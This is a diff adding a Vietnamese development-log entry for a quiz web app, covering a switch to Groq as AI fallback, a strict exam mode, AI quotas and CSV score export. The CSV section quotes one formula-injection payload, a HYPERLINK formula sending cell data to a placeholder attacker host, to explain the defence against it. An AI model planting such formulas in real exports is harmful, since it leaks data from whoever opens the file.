@@ -44,6 +44,8 @@
 
 | 19/08 | **Cảnh báo gian lận live trong phòng đấu** (V20) — cờ riêng cho host, nhắc riêng, khuôn lặp thay vì đếm số lần, 30 test · phát hiện thiết kế đã chốt không khớp schema · sửa 1 test đỏ có sẵn trên `main` | 8/8 | 🟢 xong |
 
+| 20/08 | **Đổi dự phòng AI sang Groq** · **FR-48 thi nghiêm ngặt** (V21) · **FR-58 xuất bảng điểm CSV** · **FR-84 hạn mức AI** (V22) — 494 test BE / 67 FE · sửa 2 lỗi có sẵn | 9/9 | 🟡 chờ key Groq để đo fallback |
+
 > 🔴 chưa bắt đầu · 🟡 đang làm · 🟢 xong · 🔵 nghỉ/đệm
 
 ---
@@ -3009,6 +3011,178 @@ người một thông báo thành tích".
 
 Bài học giống hệt chuyện đối chứng dương ở trên: một test xanh/đỏ không nói gì nếu nó không kiểm đúng thứ tên
 nó ghi.
+
+---
+
+## 📅 T5 — 20/08/2026 — Đổi nhà cung cấp dự phòng sang Groq, và FR-48
+
+**Mục tiêu:** làm nốt các mục còn hoãn để hoàn thiện web.
+
+**Xong:** đổi provider dự phòng xAI Grok → **Groq** (17 test) · **FR-48 chế độ thi nghiêm ngặt** (V21,
+4 test backend + 7 test frontend). Backend 454 → 475, frontend 60 → 67.
+
+---
+
+### Đổi dự phòng sang Groq: sửa một lời hứa chưa bao giờ kiểm được
+
+Người hướng dẫn đề nghị dùng **Groq** thay **Grok**. Hai chữ khác đúng một ký tự nhưng là hai thứ khác
+hẳn — Groq (groq.com) là nhà cung cấp hạ tầng suy luận chạy mô hình mở, Grok là mô hình của xAI — nên đã
+hỏi lại cho chắc trước khi động vào, vì `CLAUDE.md` ghi rõ *"stack — không tự đổi"*.
+
+Lý do đổi không phải kỹ thuật mà là **kiểm chứng được**. Nhật ký ngày 10/08 đã chốt: *xAI không có gói
+miễn phí*, key hợp lệ vẫn trả 403 `permission-denied`. Suốt cả dự án, đường dự phòng **chưa một lần chạy
+thật**, và mục 3.6 phải ghi *"chưa demo được fallback"*.
+
+> Một đường dự phòng chưa từng chạy thì không ai biết nó có chạy hay không. Nó là một lời hứa, không phải
+> một tính năng — và trong báo cáo nó là một ô trống ở đúng chỗ hội đồng sẽ hỏi.
+
+Groq có gói miễn phí nên lần đầu tiên đo được cả chuỗi bằng số liệu thật.
+
+**Một cái được ngoài dự tính: Groq có streaming.** `GrokProvider` cũ thì không. Nghĩa là trước đây nếu
+Gemini chết, trợ lý học tập (features/08) **tắt hẳn** vì `AiOrchestrator.stream()` lọc theo
+`supportsStreaming()` và danh sách còn lại rỗng. Giờ chữ vẫn chảy.
+
+**Hai chỗ đọc chuỗi được test riêng** dù nhìn rất vặt, vì cả hai **hỏng trong im lặng**:
+- `bocManh` sai → luồng streaming chạy mà không ra chữ nào; người dùng thấy ô trống, không có lỗi để đọc.
+- `docRetryAfter` đọc nhầm đơn vị (Groq trả **giây**, không phải mili-giây) → hệ thống chờ 2ms rồi gọi
+  lại, đâm vào hạn mức lần nữa; vòng lặp đó nhìn giống *"provider dự phòng vô dụng"*.
+
+**Nhật ký cũ giữ nguyên, không sửa.** Các mục ngày 08/08 và 10/08 ghi đúng sự thật lúc đó; sửa lại thành
+"Groq" là làm sai hồ sơ. Chỉ tài liệu **mô tả hệ thống hiện tại** mới đổi: `CLAUDE.md`, `tech-stack.md`,
+`architecture.md`, `overview.md`, `database.md`, `roadmap.md`, và ba file nội dung báo cáo.
+
+**Còn nợ:** chưa có `GROQ_API_KEY` nên vẫn **chưa đo được** fallback. Code và tài liệu đã sẵn sàng; thiếu
+đúng một key miễn phí. Không được ghi số nào vào mục 3.6 cho tới khi chạy thật.
+
+### FR-48: đặc tả viết "bắt buộc fullscreen", mà trình duyệt không cho bắt buộc
+
+Đây là chỗ dễ hứa quá tay nhất trong cả tính năng 12. Sự thật kỹ thuật:
+
+| Trình duyệt cho | Trình duyệt KHÔNG cho |
+|---|---|
+| Vào toàn màn hình **từ một cú bấm của người dùng** | Tự vào khi trang mở |
+| Biết lúc người dùng thoát ra | Chặn phím Esc |
+| Chặn menu chuột phải | Chặn F12 / Ctrl+Shift+I |
+
+Nên tính năng làm ba việc: che đề cho tới khi người học **chủ động** bấm vào toàn màn hình; phát hiện lúc
+thoát và nhắc; để lại tín hiệu `FULLSCREEN_EXIT`. Giá trị thật là **biến việc rời bài thi thành có chủ ý và
+để lại dấu vết**, không phải dựng một bức tường.
+
+**Ba chỗ trong giao diện đều nói thật về giới hạn đó** — chữ trợ giúp ở form soạn quiz, cảnh báo ở trang
+giới thiệu, và cửa vào trước khi làm bài. Nói dối rằng *không thể* thoát là lời hứa mà ai cũng tự phát hiện
+sai ngay lần đầu bấm Esc; nguy hiểm hơn là **giáo viên tin vào một rào chắn không tồn tại** rồi bỏ qua việc
+rà soát tín hiệu — tức mất đúng thứ có tác dụng thật.
+
+**Ba quyết định giao diện, mỗi cái là một cặp đánh đổi:**
+
+| Quyết định | Vì sao không làm ngược lại |
+|---|---|
+| **Che đề** ở cửa vào, không chỉ hiện cảnh báo | Dải cảnh báo mà bên dưới vẫn đọc được đề thì chẳng ai bấm nút; chế độ nghiêm ngặt thành dòng chữ trang trí |
+| **Thoát giữa chừng thì chỉ nhắc**, không che lại | Che đi là phạt người bấm nhầm Esc bằng cách chặn họ làm tiếp, trong khi tín hiệu đã ghi rồi |
+| **Thiết bị không hỗ trợ vẫn cho làm bài** | Safari trên iPhone không có Fullscreen API cho phần tử thường; chặn là biến hạn chế thiết bị thành mất quyền dự thi |
+
+**Luật quan trọng nhất, và là chỗ dễ hỏng nhất:** API trả `strictExam` **đã tính cho từng lượt**
+(`quiz.strictExam && mode == EXAM`), không trả cờ thô của quiz. Trả cờ thô thì frontend phải tự nhớ nhân
+với chế độ ở **mọi** chỗ dùng, và một chỗ quên là người **luyện tập bị ép toàn màn hình** — vi phạm thẳng
+ràng buộc "luyện tập không bị theo dõi". Có test riêng cho đúng tình huống đó: cùng một quiz bật cờ, lượt
+EXAM nhận `true`, lượt PRACTICE nhận `false`.
+
+**Một cái bẫy nhỏ ở đường cập nhật:** `QuizRequest.strictExam` dùng `Boolean` bao chứ không phải `boolean`
+nguyên thuỷ. Client cũ không gửi trường này thì `null`, và service **giữ nguyên** giá trị đang có. Dùng
+kiểu nguyên thuỷ thì mỗi lần một form thiếu trường gọi cập nhật là âm thầm tắt cờ của chủ quiz. Có test
+riêng: sửa tiêu đề mà không gửi `strictExam` thì cờ vẫn bật.
+
+### Ghi chú báo cáo
+
+- **Mục 1.x (công nghệ):** phần so sánh nhà cung cấp AI phải sửa — bảng cũ ghi xAI Grok. Lý do đổi là một
+  ví dụ tốt cho *ràng buộc thực tế của gói miễn phí ảnh hưởng tới lựa chọn kiến trúc*.
+- **Mục 3.6:** vẫn **chưa được ghi số** cho fallback. Có key Groq thì đo ngay: tắt Gemini bằng cách để sai
+  key, gọi sinh đề, đo thời gian chuyển và xác nhận kết quả vẫn đúng cấu trúc.
+- **"Khó khăn & cách giải quyết":** FR-48 là ví dụ mẫu cho *đặc tả yêu cầu một thứ nền tảng không cho
+  phép* — và cách xử lý là làm phần làm được rồi **nói thật về phần không làm được**, thay vì đặt tên
+  tính năng nghe như đã làm được.
+- **Mục 3.4:** thêm 11 test, trong đó test "lượt luyện tập không bị áp cờ" là loại test giữ một **ràng
+  buộc của đặc tả**, không phải giữ một chi tiết kỹ thuật.
+
+---
+
+### FR-58 xuất bảng điểm: hoá ra CSV cũng có "hỏng lặng lẽ"
+
+Lý do hoãn cũ phân biệt rõ: *CSV rẻ, PDF cần thêm thư viện và phải lo font tiếng Việt — một chỗ hỏng lặng
+lẽ, chữ ra ô vuông, chỉ phát hiện khi mở file*. Làm CSV thì phát hiện **CSV có đúng ba lỗi cùng loại đó**:
+server trả 200, file tải về được, mở được, chỉ nội dung sai.
+
+| Luật | Không làm thì |
+|---|---|
+| **BOM UTF-8 đầu tệp** | Excel trên Windows không tự đoán UTF-8 cho `.csv`: "Nguyễn" thành "Nguyá»…n" |
+| **Thoát theo RFC 4180** | Một dấu phẩy trong tên người đẩy lệch cả hàng, điểm gán sang cột khác |
+| **Chặn tiêm công thức** | Tên bắt đầu bằng `=` `+` `-` `@` **chạy như công thức** khi giáo viên mở |
+
+Cái thứ ba là **lỗ hổng bảo mật thật**, không phải chuyện định dạng: tên hiển thị do người dùng tự đặt, nên
+một học sinh đặt tên là `=HYPERLINK("http://kẻ-xấu/?d="&A1,"Bấm vào")` thì ô đó chạy trên máy **giáo viên** —
+người không làm gì sai. Chặn bằng dấu nháy đơn đứng trước; **bọc ngoặc kép là không đủ**, Excel vẫn diễn
+giải công thức bên trong ngoặc kép. Ngoặc kép là luật *định dạng*, không phải luật *an toàn*.
+
+PDF vẫn không làm, ranh giới không đổi.
+
+### FR-84 hạn mức AI: làm phần chặn trước, ô nhập sau
+
+Mục này hoãn từ lát cắt 10 với lý do đáng giữ nguyên: *một ô nhập hạn mức không chặn được gì còn tệ hơn
+không có ô nào*, vì quản trị viên sẽ tin rằng chi phí đã bị giới hạn. Nên lần này làm đúng thứ tự — bộ đếm
+và điểm chặn trước, ô nhập cuối cùng.
+
+**`null` khác `0`, và cùng con số `0` mang hai nghĩa trái ngược:**
+
+| Giá trị | Nghĩa |
+|---|---|
+| `null` | Chưa đặt riêng → dùng mặc định hệ thống |
+| `0` do quản trị viên đặt | **Cấm** người này gọi AI |
+| `0` là mặc định hệ thống | **Chưa bật** hạn mức, không chặn ai |
+
+Phân biệt bằng **nguồn** của con số. Gộp lại thì hoặc không cấm được ai, hoặc mọi tài khoản mới bị cấm ngay
+từ lúc tạo — và triệu chứng sẽ là "AI hỏng", rất khó lần ra nguyên nhân.
+
+**Ba quyết định còn lại, mỗi cái tránh một cách hỏng khác nhau:**
+
+- **Đếm ở Redis nhưng dựng lại được từ `ai_request_logs`.** Redis chạy không bật AOF; không dựng lại thì một
+  lần restart là xoá hạn mức của cả hệ thống mà không ai nhận ra. Có test riêng chứng minh restart không
+  tặng thêm lượt cho ai.
+- **Đếm lượt của người dùng, không đếm lần thử lại.** Một lần sinh đề hỏng rồi thử lại 3 lần vẫn là *một*
+  lượt; đếm từng lần thử thì hạn mức phụ thuộc vào việc nhà cung cấp hôm nay có ổn định hay không.
+- **Lần bị chặn không tính là đã dùng** — không lùi bộ đếm thì con số ở khu quản trị leo mãi và mất nghĩa.
+
+**Nhúng học liệu không tính vào hạn mức:** một tài liệu chia 50 đoạn là 50 lời gọi `embed` cho *một* hành
+động; tính vào thì hạn mức 20 lượt hết ngay ở tài liệu đầu tiên.
+
+### Hai lỗi có sẵn moi ra được nhờ chạy full suite
+
+**1. `AiGradingIntegrationTest` đỏ hai lần theo hai kiểu, xanh khi chạy riêng.** Gốc: `reset(aiOrchestrator)`
+chạy trong khi luồng chấm nền của phép kiểm *trước* còn đang gọi mock — stub bị xoá giữa chừng, lời gọi trả
+null, câu bị đánh `AI_FAILED`. Vá từng test không hết; sửa gốc là **chờ luồng nền lắng xuống rồi mới reset**.
+
+**2. Neo4j deadlock ở `rebuildForUser` — lỗi thật, không phải flake.** Đọc stack thì thấy nó đi qua
+`rebuildForUser → syncPublicCatalog`, mà **vòng thử lại deadlock chỉ bọc đường `sync(attemptId)`**. Hai
+đường ghi vào *cùng những nút Quiz*, nên chạy song song thì đường không được bọc đổ ra thành lỗi 500 cho
+người dùng. Gom vòng thử lại thành một chỗ dùng chung cho cả hai. Thử lại **mỗi quiz riêng**, không bọc cả
+vòng lặp: bọc cả vòng thì một deadlock ở quiz thứ 50 làm chạy lại từ quiz đầu — vô ích, và làm tăng đúng
+thứ gây deadlock là thời gian giữ khoá.
+
+Bài học lặp lại lần thứ ba trong dự án: **chạy riêng một lớp test không đủ để kết luận nó đúng.**
+
+### Một sai lầm của chính em, ghi lại để không lặp
+
+Chạy `mvnw compile` và sửa mã nguồn **trong lúc `mvnw test` đang chạy nền** — cả ba dùng chung `target/`.
+Kết quả: một lượt 14 lỗi `Unable to find a @SpringBootConfiguration` và `NoClassDefFoundError`, không liên
+quan gì tới code. Mất một vòng chạy 10 phút để nhận ra. Từ đó làm tuần tự.
+
+### Ghi chú báo cáo
+
+- **Mục 3.4:** hai lỗi ở trên là ví dụ tốt cho *vì sao phải chạy full suite chứ không chỉ chạy lớp vừa sửa*.
+  Cái thứ hai đặc biệt đáng kể vì nó là **lỗi sản phẩm**, chỉ lộ ra dưới tải đồng thời.
+- **"Khó khăn & cách giải quyết":** FR-58 là ví dụ cho *một tính năng nhìn tưởng tầm thường lại chứa lỗ hổng
+  bảo mật* (tiêm công thức CSV). FR-84 là ví dụ cho *thứ tự làm quyết định tính năng có giá trị hay không*.
+- **Mục 2.8:** V21 và V22 đều là cột thêm vào bảng có sẵn, và cả hai đều có một quyết định về `null` —
+  `strict_exam` mặc định FALSE, `ai_daily_quota` mặc định NULL, vì hai lý do khác nhau.
 
 ---
 
